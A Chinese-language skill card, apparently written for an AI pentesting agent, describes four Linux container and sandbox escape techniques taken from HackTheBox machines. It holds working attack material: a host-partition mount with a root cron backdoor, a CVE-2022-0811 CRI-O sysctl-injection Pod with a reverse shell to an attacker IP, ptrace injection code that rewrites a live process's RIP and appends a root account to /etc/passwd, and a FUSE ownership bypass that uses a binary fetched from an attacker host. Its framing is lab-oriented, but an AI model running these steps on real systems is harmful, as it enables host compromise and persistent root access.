---
name: 'linux-sandbox-boundary-escape'
description: '容器/沙箱里出现不该出现的东西:ls /dev 有 sda*、能建 Pod 且 CRI-O 老旧、被丢进 chroot 但同 UID 有进程在 jail 外、root 文件我必须读 —— 四条非典型边界绕过:裸分区 mount / sysctl 注入(cr8escape) / ptrace 打穿 chroot / FUSE(sshfs) 所有权绕过。（检索词：cr8escape/CVE-2022-0811/CRI-O/cri-o/sysctl/ptrace/chroot escape/chroot-escape/chroot/FUSE/sshfs/allow_other/mount/partition/raw partition/raw-partition/裸分区/lsblk/dev/sda/sda1/nvme/ptrace_scope/yama/yamaptrace_scope/挂载逃逸/所有权绕过/容器逃逸/container-escape)（检索词：linux/sandbox/boundary/sandbox escape/sandbox-escape）'
whenToUse: '确认自己在容器/chroot/FUSE 沙箱里,且 privileged Docker / SA token / etcd / IMDS 路线都不通时加载;standard 路径转 container-escape,拿到 root 后转 linux-privesc'
metadata: { domain: linux, tier: T2 }
---

# Linux 隔离边界绕过的非典型原语

> 来自 Insane 官方 WP 逐台回核,**4 台命中**:PikaTwoo / Scanned / Reddish / Skyfall。
> 🔑 边界不是「有没有」,而是「谁在替内核做判断」。

## 触发信号

- `ls /dev` 有 `sda1`…`sda5`/`nvme*`,但 `mount` 里没有它们;`lsblk`/`cat /proc/partitions` 列得出 → 模式 1
- 有 kubeconfig(哪怕只在一个 namespace 能 `create pods`);minikube 1.28.0-0 或 `"ContainerRuntime": "crio"` → 模式 2
- 被丢进 chroot 但 `ps` 里有**同 UID** 进程在 jail 外、或 `cat /proc/sys/kernel/yama/ptrace_scope` 返回 `0` → 模式 3
- root 文件(`-rw------- 1 root root`)落在我控制的目录里、或 `/dev/fuse` 存在且可写 → 模式 4

> ⚠️ `lsblk` / `cat /proc/partitions` / `grep CapEff` / `crio --version` / `fusermount -u` / `user_allow_other` 是**通用探针**,62 台 WP 里没有逐字出现(Reddish 用的是 `ls /dev` + `mount`;Scanned 用的是 `capsh --decode=02401c0`)。照用无妨,但别当 WP 证据。

## 前置验证

```bash
id; cat /proc/1/cgroup; ls -la /dev | head -40; lsblk; cat /proc/partitions
cat /proc/sys/kernel/yama/ptrace_scope     # 0 = 同 UID 可随意 ptrace
capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}'); dpkg -l | grep -i minikube
kubectl --kubeconfig <cfg> get namespaces 2>&1 | head
# ⚠️ 上面 lsblk / /proc/partitions / CapEff / crio --version 属通用探针,非 WP 逐字
```

## 模式 1: 容器里看得见裸块设备 → 直接 mount 宿主分区

条件:容器没做设备白名单,宿主磁盘 `/dev/sda*` 直接透进来。挂上就是在宿主文件系统上写文件。

```bash
cd /var/tmp; ls /dev; mount
mkdir sda{1,2,3,4,5}
for number in 1 2 3 4 5; do mount /dev/sda$number sda$number; done
# sda2 contains the host filesystem
cat /sda2/etc/shadow 2>/dev/null
```

收尾:把 `* * * * * root echo <base64> | base64 -d | bash` 写进 `/sda2/etc/cron.d/`。

### HTB 案例
| 机器 | 细节 |
|------|------|
| Reddish | 在 `172.20.0.2`("backup")里 `ls /dev` 见 `sda1`-`sda5`;**sda2 contains the host filesystem**;cron 写进 `/sda2/etc/cron.d` → 拿到 `10.10.10.94`(Reddish 本体)的 root |

🔴 先 `mount -o ro`。WP 里是裸 `mount`(可写),写宿主 `/etc/cron.d` 属于改宿主。

## 模式 2: 编排层 sysctl 注入 —— cr8escape / CVE-2022-0811

条件:能建 Pod(哪怕只一个 namespace),且 runtime 是有漏洞的 CRI-O(minikube 自带那版就中)。
CRI-O 只校验 `+` **之前**那个 sysctl 名,`value` 里再塞一个 `+` 就能注入任意内核参数;选 `kernel.core_pattern` 即可执行任意脚本。

```bash
K="kubectl --kubeconfig /home/jennifer/.kube/config"
$K get pods; dpkg -l | grep minikube                        # 1.28.0-0
cat /home/jennifer/.minikube/profiles/minikube/config.json   # "ContainerRuntime": "crio"
$K get namespaces                                            # 无权限就试 development
```

payload 直接写宿主:`/home/andrew/Documents/.script.sh` = `bash -i &>/dev/tcp/10.10.14.40/7777 0>&1`
(PoC 无宿主权限时用 `/var/lib/containers/storage/overlay/$overlay/diff/script.sh`)

```yaml
apiVersion: v1
kind: Pod
metadata: {name: sysctl-set}
spec:
  securityContext:
    sysctls:
    - name: kernel.shm_rmid_forced
      value: "1+kernel.core_pattern=|/home/andrew/Documents/.script.sh #"
  containers: [{name: alpine, image: alpine:latest, command: ["tail","-f","/dev/null"]}]
```

```bash
$K create -f ./sysctl-set.yaml -n development
nc -lnvp 7777
$K exec -it malicious-script-host -n development -- /bin/sh
ulimit -c unlimited; tail -f /dev/null &; ps; kill -SIGSEGV <pid>
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| PikaTwoo | jennifer 的 kubeconfig 组可读 → minikube 1.28.0-0 + CRI-O → 只有 `development` 能建 Pod → 注入 `kernel.core_pattern`(`cat /proc/sys/kernel/core_pattern` 验证)→ SIGSEGV 触发 → **reverse shell as root on the node** |

## 模式 3: chroot ≠ 隔离 —— ptrace 注入 + 悬空 fd

三个条件全中才成立:**① 同 UID 有进程在 jail 外;② `ptrace_scope=0`;③ 该进程持有指向 jail 外的 fd。**
chroot 只改**绝对路径解析**,不隔离相对路径、fd、ptrace。沙箱源码里两个错:`do_trace()` 在 fork **之前**就
`prctl(PR_SET_DUMPABLE,1,0,0,0,0)`,于是 child/killer/logger 三进程全可 trace;`do_child()` 只在自己里
`close(jailsfd)`(`jailsfd = open("jails", O_RDONLY|__O_DIRECTORY)`,指向 jail 的父目录),killer/logger 仍持有它。

`/proc/sys/kernel/yama/ptrace_scope` 多数发行版是 `1`,**Debian 是 `0`(unrestricted)**。
利用(chw00t 派生,`PTRACE_ATTACH` → 改 RIP → `PTRACE_POKEDATA` 写 payload):

```c
const int pid = 3;                                 // PID ns: logger=1 child=2 killer=3
ptrace(PTRACE_ATTACH, pid, 0, 0); wait(NULL);
ptrace(PTRACE_GETREGS, pid, NULL, &regs);
putdata(pid, regs.rip, (char*)inject, (int)(&guard - &inject));   // 内部 PTRACE_POKEDATA
ptrace(PTRACE_DETACH, pid, 0, 0);
void do_stage_2() {                                // 跑在 killer 里
  fchdir(3); chdir("../../../../../../../../../../");   // fd 3 = 悬空 fd
  int file_fd = open("./var/www/malscanner/malscanner.db", O_RDONLY);
}
```

`inject()` 手写 `execve("/userprog", ["/userprog","2",NULL], NULL)`(`movq $59, %%rax` + `syscall`)。
提权变体:stage 2 改 `execve("bin/su", NULL, NULL)`,劫持 `libpam_misc.so.0` 的 constructor 追加 `echo 'root2:YiY4/N2td230w:0:0:root:/root:/bin/bash' >> /etc/passwd`。

### HTB 案例
| 机器 | 细节 |
|------|------|
| Scanned | `/var/www/malscanner/sandbox/sandbox` 持 `CAP_SYS_CHROOT\|CAP_SETUID\|CAP_SETGID\|CAP_SYS_ADMIN\|CAP_SETPCAP`;注入 killer(3) 读 `malscanner.db` → `hashcat -m 20` 出 `clarence:onedayyoufeellikecrying`;提权阶段同样注入后劫持 `libpam_misc.so.0` → `su root2` / `suidroot` |

🔴 `PTRACE_POKEDATA` 是**改写一个活进程的 RIP**;PID 猜错就崩掉别人的进程,真实环境等于直接踩 EDR。

## 模式 4: FUSE / sshfs 所有权绕过

条件:目标文件 root 拥有、但你**控制它所在的目录**,且 `/dev/fuse` 可用。FUSE 挂载后内核不再拿底层 inode 的 owner 做判断,而是**相信 FUSE daemon 的答复**;daemon 以你(askyy)的身份运行,它"看到"的新文件就是你的。

```bash
python3 -m http.server 8000        # 攻击机侧
wget http://<YOUR_IP>:8000/sshfs -o /tmp/sshfs; chmod +x /tmp/sshfs
mkdir /tmp/test
/tmp/sshfs -o allow_other askyy@localhost:/home/askyy /tmp/test
cd /tmp/test && sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -d
cat debug.log
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Skyfall | `vault-unseal -d` 生成的 `debug.log` 是 `-rw------- 1 root root` 且 `cat` 报 Permission denied;静态 `sshfs`(SSHFS version 3.7.3)加 `-o allow_other` 把 `/home/askyy` 挂到 `/tmp/test` 后同一文件变 `askyy askyy` → 读出 `Master token found in config: <REDACTED>` → `vault login` 成 root |

🔴 用完 `fusermount -u /tmp/test`;`allow_other` 要求 `user_allow_other` 或你在 `fuse` 组。

## 快速检查清单

```bash
[ ] ls /dev | grep -E 'sd|nvme|vd'; lsblk; cat /proc/partitions; mount
[ ] mount 里缺了哪些块设备?→ 逐个 mount -o ro
[ ] cat /proc/sys/kernel/yama/ptrace_scope → 0 ?ps -ef 里有同 UID 却在 jail 外的进程?
[ ] 哪个 ns 能 create pods?crio/minikube 落在 CVE-2022-0811 区间?动手前:能 umount 吗?
```

## 教训

1. **隔离边界是「实现」不是「属性」** —— 判定时问"内核在替谁做判断",不要问"这是不是容器"。
2. **`ptrace_scope=0` 是免死金牌,chroot 只改绝对路径解析** —— 同 UID 即可 attach;相对路径、fd、ptrace 不受 chroot 管;CRI-O 的 sysctl 校验只挡 `+` 之前的名字,FUSE 则把权限判断外包给用户态(能挂就能"成为" owner,同 NFS 的 UID 信任)。
3. 🔴 **四条路都会改目标状态** —— 挂宿主分区 / 注入内核参数 / 改别人 RIP / 覆盖宿主 cron;按 AGENTS.md 红线先确认可逆性(二次挂载已挂载的 ext4 会把靶机打成只读)。

## 相关卡

- `container-escape` —— 标准路径(privileged Docker / SA token / RBAC / etcd / LXD / IMDS)先走那张
- `linux-privesc` / `overlayfs-privesc` / `noncontainer-sandbox-escape` —— 逃出后拿 root / 另外两种沙箱(OverlayFS CVE、snap·flatpak·firejail)
- `rbash-escape` / `nfs-privesc` —— 受限 shell / 另一条 UID 信任被滥用的路
- `symlink-attack-patterns` / `command-safety-red-lines` —— 写宿主目录之后 / mount·ptrace 前的可逆性红线;边界再下一层(虚拟机)见 `cve-2026-53359-januscape-kvm-escape`
